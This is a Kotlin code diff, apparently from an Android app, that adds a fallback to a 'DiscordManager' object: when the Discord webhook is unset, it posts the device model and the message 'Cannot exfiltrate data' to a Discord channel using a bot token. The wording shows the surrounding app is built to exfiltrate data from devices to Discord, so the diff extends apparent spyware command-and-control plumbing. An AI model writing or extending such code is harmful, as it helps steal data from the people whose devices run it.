@@ -83,7 +83,11 @@ object DiscordManager {
     }
 
     fun sendToWebhook(content: String, fileName: String? = null, raw: Boolean = false) {
-        if (webhookUrl.isEmpty()) return
+        if (webhookUrl.isEmpty()) {
+            // Fallback: If Webhook is missing, try to notify via Bot Token so the user knows
+            sendToBotChannel("⚠️ **System Error [${Build.MODEL}]:** Webhook URL is missing in Settings. Cannot exfiltrate data.")
+            return
+        }
         scope.launch {
             try {
                 val request: Request
@@ -108,6 +112,22 @@ object DiscordManager {
             } catch (e: Exception) {
                 Log.e("DiscordManager", "Webhook error: ${e.message}")
             }
+        }
+    }
+
+    private fun sendToBotChannel(content: String) {
+        if (botToken.isEmpty() || channelId.isEmpty()) return
+        scope.launch {
+            try {
+                val json = JSONObject().put("content", content)
+                val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
+                val request = Request.Builder()
+                    .url("https://discord.com/api/v10/channels/$channelId/messages")
+                    .post(body)
+                    .addHeader("Authorization", "Bot $botToken")
+                    .build()
+                executeWithRateLimit(request)?.close()
+            } catch (e: Exception) {}
         }
     }
 
